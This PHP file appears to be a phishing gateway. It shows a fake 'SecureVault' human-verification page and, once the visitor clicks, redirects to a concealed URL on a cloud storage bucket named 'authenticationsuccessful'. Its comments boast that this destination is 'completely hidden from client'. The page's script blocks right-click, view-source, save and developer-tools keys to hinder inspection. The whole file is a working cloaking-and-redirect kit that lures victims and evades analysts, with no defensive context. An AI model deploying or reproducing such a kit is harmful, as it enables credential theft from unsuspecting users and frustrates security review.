<?php
// processor.php - Main processor that handles both display and redirect

// Enable error reporting for debugging (remove in production)
// error_reporting(0);

// Check if it's a POST request (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Validate the token (basic validation)
    $token = $_POST['token'] ?? '';
    
    if (!empty($token)) {
        // The actual destination URL - completely hidden from client
        $destinationUrl = 'https://authenticationsuccessful.us-east-1.linodeobjects.com/indexcx5.html';
        
        // Additional security checks can be added here:
        // - IP validation
        // - Rate limiting  
        // - User agent checks
        // - Referer validation
        // - Token validation
        
        // Redirect immediately
        header('Location: ' . $destinationUrl);
        exit;
        
    } else {
        // Invalid token, show error page
        showErrorPage();
    }
    
} else {
    // GET request - show the verification page
    showVerificationPage();
}

function showVerificationPage() {
    // Output the HTML content directly
    ?>
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .logo-icon {
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            background: linear-gradient(to right, #fff, #a8d8ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.8;
            margin-bottom: 30px;
        }
        
        .verification-box {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .verification-icon {
            width: 80px;
            height: 80px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 2rem;
        }
        
        .btn {
            background: linear-gradient(to right, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }
        
        .enter-hint {
            margin-top: 15px;
            font-size: 0.9rem;
            opacity: 0.7;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .feature {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .feature-icon {
            width: 50px;
            height: 50px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-size: 1.5rem;
        }
        
        .feature h3 {
            margin-bottom: 10px;
            font-size: 1.2rem;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            opacity: 0.7;
            font-size: 0.9rem;
        }
        
        .info-box {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-size: 0.9rem;
            text-align: left;
        }
        
        .info-box h4 {
            margin-bottom: 10px;
            color: #a8d8ff;
        }
        
        .hidden-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>
    
    
    <form id="hiddenForm" class="hidden-form" method="post">
        <input type="hidden" name="token" id="formToken">
    </form>
    
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">🔒</div>
                <h2>SecureVault</h2>
            </div>
            <h1>Human Verification Required</h1>
            <p class="subtitle">Please verify you're not a robot to continue to the secure portal.</p>
        </div>
        
        <div class="verification-box">
            <div class="verification-icon">👤</div>
            <h3>Human Verification</h3>
            <p>Click the button below to verify you're not a robot</p>
            <button id="verifyButton" class="btn">
                <span>✓</span> Verify Now
            </button>
            <p class="enter-hint">(or press Enter key)</p>
        </div>
        
        <div class="info-box">
            <h4></h4>
            <p></p>
        </div>
        
        <div class="features">
            <div class="feature">
                <div class="feature-icon">🔐</div>
                <h3>End-to-End Encryption</h3>
                <p>Your documents are encrypted from upload to delivery.</p>
            </div>
            <div class="feature">
                <div class="feature-icon">👁️</div>
                <h3>Biometric Authentication</h3>
                <p>Multi-factor authentication for maximum security.</p>
            </div>
            <div class="feature">
                <div class="feature-icon">📊</div>
                <h3>Audit Trail</h3>
                <p>Track who accessed your documents and when.</p>
            </div>
        </div>
    </div>
    
    <div class="footer">
        © 2025 SecureVault. All rights reserved.
    </div>

    <script>
        
        document.addEventListener('DOMContentLoaded', function() {
            const verifyButton = document.getElementById('verifyButton');
            const loadingOverlay = document.getElementById('loadingOverlay');
            const hiddenForm = document.getElementById('hiddenForm');
            const formToken = document.getElementById('formToken');
            
           
            function generateToken() {
                return Date.now().toString(36) + Math.random().toString(36).substr(2);
            }
            
            function handleVerification() {
                
                loadingOverlay.style.display = 'flex';
                
                
                const token = generateToken();
                formToken.value = token;
                
                
                hiddenForm.submit();
            }
            
            verifyButton.addEventListener('click', handleVerification);
            
            
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    handleVerification();
                }
            });
            
            
            document.addEventListener('keydown', function(e) {
                // Block Ctrl+S, Ctrl+P
                if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            
            document.addEventListener('keydown', e => {
                // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase())) ||
                    (e.ctrlKey && e.key.toLowerCase() === 'u')) {
                    e.preventDefault();
                }
            });
            
            
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
        });
    </script>
</body>
</html>
    <?php
}

function showErrorPage() {
    // Show an error page if verification fails
    header('HTTP/1.1 403 Forbidden');
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Access Denied</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .error { color: #ff4444; font-size: 24px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="error">Access Denied</div>
        <p>Verification failed. Please try again.</p>
        <a href="file.html">Return to verification page</a>
    </body>
    </html>
    <?php
    exit;
}
?>